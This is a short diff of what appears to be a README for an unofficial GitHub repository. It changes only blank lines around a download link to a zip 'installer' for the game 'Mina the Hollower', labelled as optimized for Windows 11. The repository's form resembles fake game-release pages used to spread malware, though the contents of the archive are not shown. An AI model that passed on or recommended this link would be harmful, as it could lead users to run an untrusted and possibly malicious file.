@@ -18,8 +18,8 @@
 ---
 ## Install
 [Download `mina-hollower-installer.zip`](https://github.com/Jadoox3/Mina-The-Hollower-Release/releases/download/mina-hollower-switch/mina-hollower-installer.zip)
-
 ---
+
 > Optimized for Windows 11.
 
 ## Installation
